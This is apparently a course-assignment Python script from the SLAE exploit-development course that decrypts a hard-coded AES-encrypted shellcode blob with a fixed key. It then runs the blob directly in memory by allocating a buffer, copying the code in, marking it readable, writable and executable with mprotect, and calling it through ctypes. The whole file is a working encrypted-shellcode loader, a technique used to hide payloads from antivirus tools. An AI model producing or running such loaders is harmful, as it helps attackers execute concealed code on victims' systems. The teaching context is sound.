#!/usr/bin/env python

####################################################
#
# shellcode-decrypter.py
# by Michael Born (@blu3gl0w13)
# Student ID: SLAE-744
# September 26, 2016
#
####################################################

# Imports

from Crypto.Cipher import AES
import sys
#import argparse
import os
import hashlib
from ctypes import *


#---------------------------------------
#
# Define our Encryption Functions
#
#--------------------------------------


def aesDecrypter(key, IV, shellcode, salt):
  hashedKey = hashlib.sha256(key + salt).digest()
  mode = AES.MODE_CBC
  initVector = IV
  decrypterObject = AES.new(hashedKey, AES.MODE_CBC, initVector)
  messageToDecrypt = shellcode
  clearText = decrypterObject.decrypt(messageToDecrypt)
  #print "\n\n[+] RAW AES Decrypted Shellcode (non hex encoded): \n\"%s\"\n\n" % clearText
  return clearText
  sys.exit(0)

def main():
  # Setup the argument parser

#  parser = argparse.ArgumentParser()
#  parser.add_argument("-s", "--shellcode", help="Shellcode to encrypt", dest='shellcode', required=True)
#  parser.add_argument('-k', '--key', help='AES key to use for encryption', dest='key', required=True)
#  options = parser.parse_args()


  # Prepare some objects
  encryptedPayload = "\x36\xe9\x6e\xd6\x49\xb6\xf5\x0e\x49\x7b\x67\x5e\xba\x66\x6f\x1e\x66\x01\x46\x09\x55\x82\xa1\x1b\x98\x21\xa7\xaa\x16\xc0\xe1\xcb\xc2\x5d\xd4\x57\x2c\x83\x07\x56\x27\x56\xd6\x3b\x6c\xa5\x47\x36\xbd\x68\x53\x7d\x9a\xb4\x63\x16\x71\xbd\x40\x2b\x8d\xd4\x72\x51"


#  encryptedPayload = (options.shellcode).replace("\\x", "").decode('hex')
  IV = encryptedPayload[:16]
  salt = encryptedPayload[16:32]
  key = 'slae32'
  shellcode = encryptedPayload[32::]

  decrypted = aesDecrypter(key, IV, shellcode, salt)


  # now we need to run our shellcode from here

  # use ctypes.CDLL to load /lib/i386-linux-gnu/libc.so.6

  libC = CDLL('libc.so.6')

  #print decrypted
#  shellcode = str(decrypted)
#  shellcode = shellcode.replace('\\x', '').decode('hex')


#  code = c_char_p(shellcode)

  code = c_char_p(decrypted)
#  sizeOfDecryptedShellcode = len(shellcode)
  sizeOfDecryptedShellcode = len(decrypted)

  # now we need to setup our void *valloc(size_t size) and get our pointer to allocated memory

  memAddrPointer = c_void_p(libC.valloc(sizeOfDecryptedShellcode))

  # now we need to move our code into memory using memmove 
  # void *memmove(void *dest, const void *src, size_t n)

  codeMovePointer = memmove(memAddrPointer, code, sizeOfDecryptedShellcode)


  # now we use mprotect to make sure we have read, write, and execute permisions in memory
  # R, WR, X = 0x7

  protectMemory = libC.mprotect(memAddrPointer, sizeOfDecryptedShellcode, 7)
#  print protectMemory

  # now we set up a quick execution for our shellcode using cast ctypes.cast = cast(obj, typ)
  # we'll have to call ctypes.CFUNCTYPE to identify memAddrPointer as void * (c_void_p) type

  run = cast(memAddrPointer, CFUNCTYPE(c_void_p))
#  print run
  run()




if __name__ != main:
  main()
